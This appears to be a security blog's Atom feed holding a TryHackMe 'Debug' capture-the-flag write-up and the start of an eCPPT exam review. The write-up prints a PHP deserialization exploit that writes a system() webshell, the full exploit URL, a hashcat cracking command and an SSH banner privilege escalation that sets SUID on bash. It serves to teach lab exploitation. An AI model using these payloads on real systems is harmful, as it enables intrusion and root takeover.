<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-07T19:32:24-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">miaulez.rocks</title><subtitle>Ethical Hacking, Penetration Testing, Security, CTFs and more.</subtitle><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><entry><title type="html">Debug - Try Hack Me</title><link href="http://localhost:4000/thm-debug-writeup/" rel="alternate" type="text/html" title="Debug - Try Hack Me" /><published>2022-01-07T00:00:00-05:00</published><updated>2022-01-07T00:00:00-05:00</updated><id>http://localhost:4000/thm-debug-writeup</id><content type="html" xml:base="http://localhost:4000/thm-debug-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hey there, welcome to the write-up for Debug, a TryHackMe box made by ustoun0 which invloves finding a backup directory which has an index.php.bak inside. Doing some code review we can quickly see that the code is vulnerable to php deserialization and we can write a shell on the webserver. Once on the box, we find a .htpasswd file which has James’s hash in it, we crack it using hashcat and then we log in via ssh as James. For root we modify 00-header, we relog via ssh and get a shell as root on the box.&lt;/p&gt;

&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Fri Jan  7 09:31:34 2022 as: nmap -sC -sV -p- -v -oN nmap/debug 10.10.24.151&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.24.151
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Jan  7 09:34:34 2022 -- 1 IP address (1 host up) scanned in 180.27 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nothing much of interest. Going to the webserver first.&lt;/p&gt;

&lt;h2 id=&quot;webserver&quot;&gt;WebServer&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just the default Apache page, the source code doesn’t reveal anything. Starting up a gobuster…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;miaulez㉿pentest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/tryhackme/debug]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.201.232&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php                                         1 ⨯
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.1.0
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.201.232
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2022/01/07 16:59:36 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/index.php            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 5732]
/javascript           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 319] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.201.232/javascript/]
/backup               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 315] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.201.232/backup/]    
/grid                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 313] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.201.232/grid/]      
Progress: 7538 / 441122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.71%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
                                                                                      
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2022/01/07 16:59:57 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;index.php and backup are the most interesting ones for now, let’s check those out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s check backup as well&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;index.php.bak sticks out, let’s take a peek inside of it.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;HTML&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SNIP&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$form_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'message.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SaveMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$NameArea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$EmailArea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$TextArea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'comments'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Message From : &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$NameArea&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; || From Email : &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$EmailArea&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; || Comment : &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TextArea&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Your submission has been successfully saved!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Leaving this for now... only for debug purposes... do not touch!&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'debug'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$messageDebug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SaveMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;


&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;HTML&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SNIP&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you can’t tell by looking at the code, there is a massive vulnerability that just waits to be exploited :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can provide serialized input via debug parameter. If we modify the “public $form_file = ‘message.txt’;” with something like shell.php, and the “public $message = ‘’;” with some php code, serialize it and deserialize it via debug, we can write a webshell on the server and get code execution.&lt;/p&gt;

&lt;p&gt;So I’ve created a little php script which will serialize the first part of the script.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$form_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'message.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’re going to modify form_file and message with our webshell&lt;/p&gt;

&lt;p&gt;The final script we’re going to use in order to exploit the deserialization vulnerability is this one.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$form_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'shell.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$rce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let us see how it is done.&lt;/p&gt;

&lt;p&gt;First, we run the exploit script which will serialize our object.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we take that line and put it in the debug parameter, full url:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.201.232/index.php?debug&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O:10:&lt;span class=&quot;s2&quot;&gt;&quot;FormSubmit&quot;&lt;/span&gt;:2:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;s:9:&lt;span class=&quot;s2&quot;&gt;&quot;form_file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:9:&lt;span class=&quot;s2&quot;&gt;&quot;shell.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:7:&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:34:&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&quot;&lt;/span&gt;cmd&lt;span class=&quot;s2&quot;&gt;&quot;]); ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing has happened, we’re getting the same page, let’s see if shell.php has been written on the server.&lt;/p&gt;

&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indeed, we do have code execution. Let’s get a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First things first, let’s stabilize our shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the same directory we’ve landed our webshell, there is a hidden file called .htpasswd. In it we’ve got what it looks like a hash and a username called “james” which is a user on the box.&lt;/p&gt;

&lt;p&gt;![]/assets/images/thm/debug/10-1.png)&lt;/p&gt;

&lt;p&gt;Let’s try cracking that hash with hashcat. First, let’s find out what mode is needed to crack that specific hash. For that, I’m gonna go to example_hashes from hashcat’s website and search for apr1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, I’m going to save the hash in a file called simply “hash” and crack it using rockyou.txt&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1600 &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; /usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The hash cracks almost instantly. We can now try to log in via ssh as james.&lt;/p&gt;

&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note-To-James.txt:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we remember correctly, when we’ve logged in via ssh, a banner appears running some uname -r things&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s because of 00-header, a bash script that runs when somebody connects via ssh to a system. We can find where that is by running find with some switches to show us just files owned by root which we can modify.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s take a look at 00-header&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s modify from “$(uname -o) into “$(chmod +s /bin/bash)” and relog&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since ssh runs as root and that bash script executes as root, we should set a suid bit on bash, thus running bash -p will give us a root shell.&lt;/p&gt;

&lt;h2 id=&quot;rooted&quot;&gt;Rooted&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That was it, an easy fun box. A great learning opportunity for people who are starting out learning php deserialization attacks.&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="php deserialization" /><category term="apache hash" /><category term="ssh banner" /><category term="privesc" /><category term="security" /><category term="pentesting" /><summary type="html">Debug invloves exploiting a php deserialization vulnerability for an initial foothold, escalating to james by cracking an apache password. For root we modify the ssh welcome banner.</summary></entry><entry><title type="html">eCPPTv2 exam review</title><link href="http://localhost:4000/ecppt-review/" rel="alternate" type="text/html" title="eCPPTv2 exam review" /><published>2022-01-06T00:00:00-05:00</published><updated>2022-01-06T00:00:00-05:00</updated><id>http://localhost:4000/ecppt-review</id><content type="html" xml:base="http://localhost:4000/ecppt-review/">&lt;p&gt;&lt;img src=&quot;/assets/images/reviews/ecppt/thumbnail.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Heyo, I know I might be a bit late on this, since I’ve taken eCPPT on 2021’s December 1st, but I’ll make this review nonetheless.&lt;/p&gt;

&lt;h2 id=&quot;what-is-ecppt&quot;&gt;What is eCPPT?&lt;/h2&gt;

&lt;p&gt;eCPPT stands for eLearnSecurity Certified Professional Penetration Tester, it is a completely hands on exam in which you are required to exploit several vulnerable systems inside a network and write a professional-grade report with your findings.&lt;/p&gt;

&lt;p&gt;The exam lasts 14 days (2 full weeks), in the first 7 days you are required to try and compromise any possible system in the network, the last 7 days are for report writing.&lt;/p&gt;

&lt;p&gt;The exam requires pivoting, advanced metasploit usage and more, here’s a list of what eLearnSecurity’s recommended prerequisites are:&lt;/p&gt;

&lt;ul&gt;
